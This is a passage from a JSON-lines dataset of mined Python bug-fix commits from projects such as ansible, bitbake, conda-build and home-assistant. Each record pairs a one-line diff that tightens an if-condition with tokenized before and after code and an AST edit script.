\"T\"], 2], [\"Insert\", \"N1\", [\"tuple\", \"N3\"], 3], [\"Insert\", \"N2\", [\"identifier:state\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:run_state\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 1], [\"Insert\", \"N3\", [\",:,\", \"T\"], 2], [\"Insert\", \"N3\", [\"attribute\", \"N5\"], 3], [\"Insert\", \"N3\", [\"):)\", \"T\"], 4], [\"Insert\", \"N4\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:ITERATING_RESCUE\", \"T\"], 2], [\"Insert\", \"N5\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N5\", [\".:.\", \"T\"], 1], [\"Insert\", \"N5\", [\"identifier:ITERATING_ALWAYS\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "da02aba173d49eabc890a1e3fbd2765ad69e9de3", "parent_sha": "e02b98274b60cdbc12ef4a4c74ae0f74207384e8", "file_path": "lib/ansible/playbook/play_context.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -519,7 +519,7 @@ class PlayContext(Base):\n \n                 var_val = getattr(self, prop)\n                 for var_opt in var_list:\n-                    if var_opt not in variables:\n+                    if var_opt not in variables and var_val is not None:\n                         variables[var_opt] = var_val\n             except AttributeError:\n                 continue\n", "before": "if var_opt not in variables : variables [ var_opt ] = var_val", "after": "if var_opt not in variables and var_val is not None : variables [ var_opt ] = var_val", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 21, 4, 53], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 24, 3, 48], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:var_val\", \"T\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 2], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 3]]"}
{"project": "ansible-1", "commit_sha": "0eca47cf91adc487af5250039381f9b468bbb258", "parent_sha": "5a57139d91c8bf02c420e8528f8544b9c2c30a87", "file_path": "lib/ansible/utils/vars.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -86,7 +86,7 @@ def merge_hash(a, b):\n     for k, v in iteritems(b):\n         # if there's already such key in a\n         # and that key contains a MutableMapping\n-        if k in result and isinstance(result[k], MutableMapping):\n+        if k in result and isinstance(result[k], MutableMapping) and isinstance(v, MutableMapping):\n             # merge those dicts recursively\n             result[k] = merge_hash(result[k], v)\n         else:\n", "before": "if k in result and isinstance ( result [ k ] , MutableMapping ) : result [ k ] = merge_hash ( result [ k ] , v ) else : ", "after": "if k in result and isinstance ( result [ k ] , MutableMapping ) and isinstance ( v , MutableMapping ) : result [ k ] = merge_hash ( result [ k ] , v ) else : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 12, 3, 65], [\"boolean_operator\", 3, 12, 3, 65], 0], [\"Insert\", [\"boolean_operator\", 3, 12, 3, 65], [\"and:and\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 12, 3, 65], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:isinstance\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"identifier:v\", \"T\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"identifier:MutableMapping\", \"T\"], 3], [\"Insert\", \"N1\", [\"):)\", \"T\"], 4]]"}
{"project": "conda-build", "commit_sha": "fafcae14f6fa73bf69c66dcf257c910d0255abc9", "parent_sha": "2823499029efa53bedf9b6e946c2776e1e9914e0", "file_path": "conda_build/cran.py", "project_url": "https://github.com/bgruening/conda-build", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -587,7 +587,7 @@ def get_outdated(output_dir, cran_metadata, packages=()):\n             if package.endswith('/'):\n                 packages[i] = package[:-1]\n \n-        if not (recipe_name in packages or recipe in packages):\n+        if packages and not (recipe_name in packages or recipe in packages):\n             continue\n \n         if recipe_name not in cran_metadata:\n", "before": "if not ( recipe_name in packages or recipe in packages ) : continue", "after": "if packages and not ( recipe_name in packages or recipe in packages ) : continue", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 21], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:packages\", \"T\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"not_operator\", 3, 12, 3, 63], 2]]"}
{"project": "bitbake", "commit_sha": "bf75370bcd6d02ed08cd959eec6190196b792515", "parent_sha": "99bdb236bceeffa0083a0fa529280b217c1d310d", "file_path": "lib/hashserv/client.py", "project_url": "https://github.com/YoeDistro/bitbake", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -99,7 +99,7 @@ class AsyncClient(object):\n             l = await get_line()\n \n             m = json.loads(l)\n-            if \"chunk-stream\" in m:\n+            if m and \"chunk-stream\" in m:\n                 lines = []\n                 while True:\n                     l = (await get_line()).rstrip(\"\\n\")\n", "before": "if \"chunk-stream\" in m : lines = [ ] while True : l = ( await get_line ( ) ) . rstrip ( \"\\n\" )", "after": "if m and \"chunk-stream\" in m : lines = [ ] while True : l = ( await get_line ( ) ) . rstrip ( \"\\n\" )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 56], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:m\", \"T\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 35], 2]]"}
{"project": "bitbake", "commit_sha": "1ec5e8fbc4859a96834e1f4ba475a175aab57a5c", "parent_sha": "4dd4c12f9672f662a80a4ae46027cae8a0605be6", "file_path": "lib/bb/cooker.py", "project_url": "https://github.com/YoeDistro/bitbake", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -97,7 +97,7 @@ class BBCooker:\n             self.configuration.cmd = bb.data.getVar(\"BB_DEFAULT_TASK\", self.configuration.data, True) or \"build\"\n \n         bbpkgs = bb.data.getVar('BBPKGS', self.configuration.data, True)\n-        if bbpkgs:\n+        if bbpkgs and len(self.configuration.pkgs_to_build) == 0:\n             self.configuration.pkgs_to_build.extend(bbpkgs.split())\n \n         #\n", "before": "if bbpkgs : self . configuration . pkgs_to_build . extend ( bbpkgs . split ( ) )", "after": "if bbpkgs and len ( self . configuration . pkgs_to_build ) == 0 : self . configuration . pkgs_to_build . extend ( bbpkgs . split ( ) )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 68], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:bbpkgs\", 3, 12, 3, 18], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"call\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:len\", \"T\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2], [\"Insert\", \"N4\", [\"attribute\", \"N5\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:pkgs_to_build\", \"T\"], 2], [\"Insert\", \"N5\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N5\", [\".:.\", \"T\"], 1], [\"Insert\", \"N5\", [\"identifier:configuration\", \"T\"], 2]]"}
{"project": "bitbake", "commit_sha": "a1adbe7a3c752832220e7ba645ff770075730d18", "parent_sha": "03176f98185c0e1111fc7f5b31b7a6da17ce5875", "file_path": "lib/bb/runqueue.py", "project_url": "https://github.com/YoeDistro/bitbake", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -886,7 +886,7 @@ class RunQueue:\n             logger.debug(2, \"%s.%s is nostamp\\n\", fn, taskname)\n             return False\n \n-        if taskname.endswith(\"_setscene\"):\n+        if taskname != \"do_setscene\" and taskname.endswith(\"_setscene\"):\n             return True\n \n         iscurrent = True\n", "before": "if taskname . endswith ( \"_setscene\" ) : return True", "after": "if taskname != \"do_setscene\" and taskname . endswith ( \"_setscene\" ) : return True", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 24], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 42], 2], [\"Insert\", \"N1\", [\"identifier:taskname\", \"T\"], 0], [\"Insert\", \"N1\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:\\\"do_setscene\\\"\", \"T\"], 2]]"}
{"project": "bitbake", "commit_sha": "608b9f821539de813bfbd9e65950dbc56a274bc2", "parent_sha": "c9c68d898985cf0bec6fc95f54c151cc50255cac", "file_path": "lib/bb/runqueue.py", "project_url": "https://github.com/YoeDistro/bitbake", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2286,7 +2286,7 @@ class RunQueueExecute:\n             current = next.copy()\n             next = set()\n             for tid in current:\n-                if not self.rqdata.runtaskentries[tid].depends.isdisjoint(total):\n+                if len(self.rqdata.runtaskentries[p].depends) and not self.rqdata.runtaskentries[tid].depends.isdisjoint(total):\n                     continue\n                 procdep = []\n                 for dep in self.rqdata.runtaskentries[tid].depends:\n", "before": "if not self . rqdata . runtaskentries [ tid ] . depends . isdisjoint ( total ) : continue", "after": "if len ( self . rqdata . runtaskentries [ p ] . depends ) and not self . rqdata . runtaskentries [ tid ] . depends . isdisjoint ( total ) : continue", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 4, 29], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"not_operator\", 3, 20, 3, 81], 2], [\"Insert\", \"N1\", [\"identifier:len\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"subscript\", \"N4\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:depends\", \"T\"], 2], [\"Insert\", \"N4\", [\"attribute\", \"N5\"], 0], [\"Insert\", \"N4\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:p\", \"T\"], 2], [\"Insert\", \"N4\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N5\", [\"attribute\", \"N6\"], 0], [\"Insert\", \"N5\", [\".:.\", \"T\"], 1], [\"Insert\", \"N5\", [\"identifier:runtaskentries\", \"T\"], 2], [\"Insert\", \"N6\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N6\", [\".:.\", \"T\"], 1], [\"Insert\", \"N6\", [\"identifier:rqdata\", \"T\"], 2]]"}
{"project": "bitbake", "commit_sha": "d787e4efc106589811651bc18ca48d5223443b95", "parent_sha": "2bd9a00facb90f7d76a9bdaa86ca765fb2159e71", "file_path": "lib/bb/ui/knotty.py", "project_url": "https://github.com/YoeDistro/bitbake", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -187,7 +187,7 @@ class TerminalFilter(object):\n             return\n         if self.footer_present:\n             self.clearFooter()\n-        if not self.helper.tasknumber_total or self.helper.tasknumber_current == self.helper.tasknumber_total:\n+        if (not self.helper.tasknumber_total or self.helper.tasknumber_current == self.helper.tasknumber_total) and not len(activetasks):\n             return\n         tasks = []\n         for t in runningpids:\n", "before": "if not self . helper . tasknumber_total or self . helper . tasknumber_current == self . helper . tasknumber_total : return", "after": "if ( not self . helper . tasknumber_total or self . helper . tasknumber_current == self . helper . tasknumber_total ) and not len ( activetasks ) : return", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 19], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"parenthesized_expression\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N2\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"not_operator\", 3, 12, 3, 110], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Insert\", \"N2\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N2\", [\"call\", \"N3\"], 1], [\"Insert\", \"N3\", [\"identifier:len\", \"T\"], 0], [\"Insert\", \"N3\", [\"argument_list\", \"N4\"], 1], [\"Insert\", \"N4\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N4\", [\"identifier:activetasks\", \"T\"], 1], [\"Insert\", \"N4\", [\"):)\", \"T\"], 2]]"}
{"project": "bitbake", "commit_sha": "4c95e5f46cf2a656100bbf5a0e5a09d506abf9b9", "parent_sha": "552b8935dd2f9f11e8d5c08a597a7e966b891480", "file_path": "lib/bb/event.py", "project_url": "https://github.com/YoeDistro/bitbake", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -237,7 +237,7 @@ class UIEventFilter(object):\n                 return True\n             return False\n         eid = str(event.__class__)[8:-2]\n-        if eid not in self.eventmask:\n+        if self.eventmask and eid not in self.eventmask:\n             return False\n         return True\n \n", "before": "if eid not in self . eventmask : return False", "after": "if self . eventmask and eid not in self . eventmask : return False", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 25], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 37], 2], [\"Insert\", \"N1\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:eventmask\", \"T\"], 2]]"}
{"project": "conda-build", "commit_sha": "1d63ad193049fdb3b04d016775046e546d88175c", "parent_sha": "c6103f00057211cb32b2247e2808945d2a832859", "file_path": "conda_build/render.py", "project_url": "https://github.com/bgruening/conda-build", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -208,7 +208,7 @@ def find_pkg_dir_or_file_in_pkgs_dirs(pkg_dist, m, files_only=False):\n @memoized\n def _read_specs_from_package(pkg_loc, pkg_dist):\n     specs = {}\n-    if os.path.isdir(pkg_loc):\n+    if pkg_loc and os.path.isdir(pkg_loc):\n         downstream_file = os.path.join(pkg_loc, 'info/run_exports')\n         if os.path.isfile(downstream_file):\n             with open(downstream_file) as f:\n", "before": "if os . path . isdir ( pkg_loc ) : downstream_file = os . path . join ( pkg_loc , 'info/run_exports' ) if os . path . isfile ( downstream_file ) : with open ( downstream_file ) as f : ", "after": "if pkg_loc and os . path . isdir ( pkg_loc ) : downstream_file = os . path . join ( pkg_loc , 'info/run_exports' ) if os . path . isfile ( downstream_file ) : with open ( downstream_file ) as f : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 6, 45], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:pkg_loc\", \"T\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"call\", 3, 8, 3, 30], 2]]"}
{"project": "conda-build", "commit_sha": "347bb97c11c060cd100b4b73a0f3e448b4baf1c7", "parent_sha": "53d00e33ecb9d212fe7b05ffa7cc1b5816e0ff21", "file_path": "conda_build/render.py", "project_url": "https://github.com/bgruening/conda-build", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -253,7 +253,7 @@ def _read_specs_from_package(pkg_loc, pkg_dist):\n         elif os.path.isfile(downstream_file + '.json'):\n             with open(downstream_file + '.json') as f:\n                 specs = json.load(f)\n-    if not specs and os.path.isfile(pkg_loc):\n+    if not specs and pkg_loc and os.path.isfile(pkg_loc):\n         # switching to json for consistency in conda-build 4\n         specs_yaml = utils.package_has_file(pkg_loc, 'info/run_exports.yaml')\n         specs_json = utils.package_has_file(pkg_loc, 'info/run_exports.json')\n", "before": "if not specs and os . path . isfile ( pkg_loc ) : specs_yaml = utils . package_has_file ( pkg_loc , 'info/run_exports.yaml' ) specs_json = utils . package_has_file ( pkg_loc , 'info/run_exports.json' )", "after": "if not specs and pkg_loc and os . path . isfile ( pkg_loc ) : specs_yaml = utils . package_has_file ( pkg_loc , 'info/run_exports.yaml' ) specs_json = utils . package_has_file ( pkg_loc , 'info/run_exports.json' )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 12, 3, 45], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", [\"boolean_operator\", 3, 12, 3, 45], [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:specs\", 3, 12, 3, 17], 0], [\"Move\", \"N0\", [\"and:and\", 3, 18, 3, 21], 1], [\"Insert\", \"N0\", [\"identifier:pkg_loc\", \"T\"], 2]]"}
{"project": "bitbake", "commit_sha": "8bce6fefdc5c046b916588962a2b429c0f648133", "parent_sha": "7546d4aeb3ba8fda9832081b84d93138dc5e58d6", "file_path": "lib/bb/utils.py", "project_url": "https://github.com/YoeDistro/bitbake", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1177,7 +1177,7 @@ def edit_metadata(meta_lines, variables, varfunc, match_overrides=False):\n             if not skip:\n                 if checkspc:\n                     checkspc = False\n-                    if newlines[-1] == '\\n' and line == '\\n':\n+                    if newlines and newlines[-1] == '\\n' and line == '\\n':\n                         # Squash blank line if there are two consecutive blanks after a removal\n                         continue\n                 newlines.append(line)\n", "before": "if newlines [ - 1 ] == '\\n' and line == '\\n' : continue", "after": "if newlines and newlines [ - 1 ] == '\\n' and line == '\\n' : continue", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 24, 3, 61], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", \"N0\", [\"identifier:newlines\", \"T\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 24, 3, 44], 2]]"}
{"project": "conda-build", "commit_sha": "d98c8a4fd40ca1b60aae0aefb88debca4e3897c5", "parent_sha": "06ed4fcee50c85a49fbb46c8f03acaf90bbd04ca", "file_path": "conda_build/exceptions.py", "project_url": "https://github.com/bgruening/conda-build", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -67,7 +67,7 @@ class DependencyNeedsBuildingError(CondaBuildException):\n         else:\n             self.packages = packages or []\n             for line in str(conda_exception).splitlines():\n-                if not line.startswith('  - '):\n+                if not line.startswith('  - ') and (':' in line or ' -> ' not in line):\n                     continue\n                 pkg = line.lstrip('  - ').split(' -> ')[-1]\n                 self.matchspecs.append(pkg)\n", "before": "if not line . startswith ( '  - ' ) : continue", "after": "if not line . startswith ( '  - ' ) and ( ':' in line or ' -> ' not in line ) : continue", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 20, 3, 47], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 24, 3, 47], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"parenthesized_expression\", \"N1\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"boolean_operator\", \"N2\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Insert\", \"N2\", [\"comparison_operator\", \"N3\"], 0], [\"Insert\", \"N2\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N2\", [\"comparison_operator\", \"N4\"], 2], [\"Insert\", \"N3\", [\"string:':'\", \"T\"], 0], [\"Insert\", \"N3\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:line\", \"T\"], 2], [\"Insert\", \"N4\", [\"string:' -> '\", \"T\"], 0], [\"Insert\", \"N4\", [\"not:not\", \"T\"], 1], [\"Insert\", \"N4\", [\"in:in\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:line\", \"T\"], 3]]"}
{"project": "home-assistant", "commit_sha": "e475b6b9c37aa8e6aa78371bd27b347f4b911f90", "parent_sha": "94fc7b8aed4f376643d0a3407e37c3cfce0588a1", "file_path": "homeassistant/components/prowl/notify.py", "project_url": "https://github.com/THATDONFC/home-assistant", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -48,7 +48,7 @@ class ProwlNotificationService(BaseNotificationService):\n             \"description\": message,\n             \"priority\": data[\"priority\"] if data and \"priority\" in data else 0,\n         }\n-        if data.get(\"url\"):\n+        if data and data.get(\"url\"):\n             payload[\"url\"] = data[\"url\"]\n \n         _LOGGER.debug(\"Attempting call Prowl service at %s\", url)\n", "before": "if data . get ( \"url\" ) : payload [ \"url\" ] = data [ \"url\" ]", "after": "if data and data . get ( \"url\" ) : payload [ \"url\" ] = data [ \"url\" ]", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 41], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:data\", \"T\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 27], 2]]"}
{"project": "home-assistant", "commit_sha": "d9c1c391bca0d74e959fca218c204cfd66533988", "parent_sha": "02cd2619bb95e9f0e1b6bb340e379f5af7ce15e2", "file_path": "homeassistant/components/prowl/notify.py", "project_url": "https://github.com/THATDONFC/home-assistant", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -48,7 +48,7 @@ class ProwlNotificationService(BaseNotificationService):\n             \"description\": message,\n             \"priority\": data[\"priority\"] if data and \"priority\" in data else 0,\n         }\n-        if data.get(\"url\"):\n+        if data and data.get(\"url\"):\n             payload[\"url\"] = data[\"url\"]\n \n         _LOGGER.debug(\"Attempting call Prowl service at %s\", url)\n", "before": "if data . get ( \"url\" ) : payload [ \"url\" ] = data [ \"url\" ]", "after": "if data and data . get ( \"url\" ) : payload [ \"url\" ] = data [ \"url\" ]", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 41], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:data\", \"T\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 27], 2]]"}
{"project": "prophetess-netbox", "commit_sha": "09b2cb305210bfb4ede432b64bbe7e101dda0bd7", "parent_sha": "9a6d99c83e3bdeeed6ddbbb7a1e563aff8aa1f27", "file_path": "prophetess_netbox/loader.py", "project_url": "https://github.com/vapor-ware/prophetess-netbox", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -78,7 +78,7 @@ class NetboxLoader(Loader):\n         changed = {}\n \n         for k, v in new_record.items():\n-            if k in self.config.get('fk', {}):\n+            if getattr(cur_record, k) and k in self.config.get('fk', {}):\n                 if getattr(cur_record, k).id != v:\n                     changed[k] = v\n                 continue\n", "before": "if k in self . config . get ( 'fk' , { } ) : if getattr ( cur_record , k ) . id != v : changed [ k ] = v continue", "after": "if getattr ( cur_record , k ) and k in self . config . get ( 'fk' , { } ) : if getattr ( cur_record , k ) . id != v : changed [ k ] = v continue", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 25], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 46], 2], [\"Insert\", \"N1\", [\"identifier:getattr\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:cur_record\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:k\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4]]"}
{"project": "ScoutSuite", "commit_sha": "71f861a52eed547180d680e5e116a4be9e76bc8f", "parent_sha": "68b5dcd5d1e12d078c3bbd6e28bd9ecba07b298b", "file_path": "ScoutSuite/providers/base/provider.py", "project_url": "https://github.com/agnivesh/ScoutSuite", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -298,7 +298,7 @@ class BaseProvider(object):\n         try:\n             key = path.pop(0)\n-            if not current_config:\n+            if not current_config and hasattr(self, 'config'):\n                 current_config = self.config\n             if not current_path:\n                 current_path = []\n", "before": "if not current_config : current_config = self . config", "after": "if not current_config and hasattr ( self , 'config' ) : current_config = self . config", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 2, 16, 2, 34], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:current_config\", 2, 20, 2, 34], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:hasattr\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:self\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"string:'config'\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4]]"}
{"project": "ScoutSuite", "commit_sha": "2215258db33c2d80e7cef0791c3046618c83ff92", "parent_sha": "6daf5670619be228329440fcbd8fd71fc2c3e56e", "file_path": "ScoutSuite/providers/base/configs/browser.py", "project_url": "https://github.com/agnivesh/ScoutSuite", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -85,7 +85,7 @@ def get_value_at(all_info, current_path, key, to_string=False):\n                 if key == 'id':\n                     target_path.append(current_path[i])\n                 # If empty key and value is an index, keep the index\n-                elif key == '' and current_path[i].isdigit():\n+                elif key == '' and i < len(current_path) and current_path[i].isdigit():\n                     target_path.append(int(current_path[i]))\n                 # Otherwise, use key\n                 else:\n", "before": "if key == 'id' : target_path . append ( current_path [ i ] ) elif key == '' and current_path [ i ] . isdigit ( ) : target_path . append ( int ( current_path [ i ] ) ) else : ", "after": "if key == 'id' : target_path . append ( current_path [ i ] ) elif key == '' and i < len ( current_path ) and current_path [ i ] . isdigit ( ) : target_path . append ( int ( current_path [ i ] ) ) else : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 22, 3, 61], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", [\"boolean_operator\", 3, 22, 3, 61], [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 22, 3, 31], 0], [\"Move\", \"N0\", [\"and:and\", 3, 32, 3, 35], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:i\", \"T\"], 0], [\"Insert\", \"N1\", [\"<:<\", \"T\"], 1], [\"Insert\", \"N1\", [\"call\", \"N2\"], 2], [\"Insert\", \"N2\", [\"identifier:len\", \"T\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"identifier:current_path\", \"T\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2]]"}
